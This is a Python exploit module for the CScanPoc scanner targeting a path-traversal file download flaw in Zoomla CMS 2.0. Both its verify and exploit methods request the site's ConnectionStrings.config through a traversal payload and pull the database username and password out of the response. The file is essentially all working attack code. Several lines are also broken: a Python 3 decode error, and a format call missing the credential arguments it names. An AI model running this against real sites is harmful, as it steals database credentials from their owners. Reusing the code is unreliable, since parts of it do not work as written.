# coding: utf-8
import re
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Zoomla_0101'  # 平台漏洞编号，留空
    name = 'Zoomla 2.0 /User/UserZone/School/Download.aspx 任意文件下载'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2014-10-17'  # 漏洞公布时间
    desc = '''
        Zoomla!逐浪®CMS是运行在微软大数据平台上的一款卓越网站内容管理系统，基于.NET4.5框架，SQL Server数据库平台（扩展支持Oracle甲骨文、MYSQL诸多数据库）、纯净的MVC架构，系统在优秀的内容管理之上，提供OA办公、移动应用、微站、微信、微博等能力，完善的商城、网店等管理功能，并包括教育模块、智能组卷、在线试戴、在线考试及诸多应用。Zoomla!逐浪®CMS不仅是一款网站内容管理系统，更是企业信息化的起点，也是强大的WEB开发平台，完全免费开放，丰富的学习资源和快速上手教程，并结合自主的字库、Webfont解决方案、逐浪云，为中国政府、军工、世界五百强企业以及诸多站长、开发者提供卓越的软件支持。
        Zoomla X2.0 has Arbitary File Download in /User/UserZone/School/Download.aspx.
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zoomla'  # 漏洞应用名称
    product_version = '2.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6215961d-834e-414b-ac79-93d88fa6e5c8'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            username = ""
            password = ""
            payload = "/User/UserZone/School/Download.aspx?f=..\\..\\..\\Config\\ConnectionStrings.config"
            verify_url = self.target + payload
            response = urllib.request.urlopen(verify_url)

            html = str(response.read()).decode('utf-8')
            data = re.compile('User ID=(.*?);Password=(.*?)"').findall(html)
            username = data[0][0]
            password = data[0][1]
            if username and password:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            username = ""
            password = ""
            payload = "/User/UserZone/School/Download.aspx?f=..\\..\\..\\Config\\ConnectionStrings.config"
            verify_url = self.target + payload
            response = urllib.request.urlopen(verify_url)

            html = str(response.read()).decode('utf-8')
            data = re.compile('User ID=(.*?);Password=(.*?)"').findall(html)
            username = data[0][0]
            password = data[0][1]
            if username and password:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;获取信息:username={username},password={password}'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
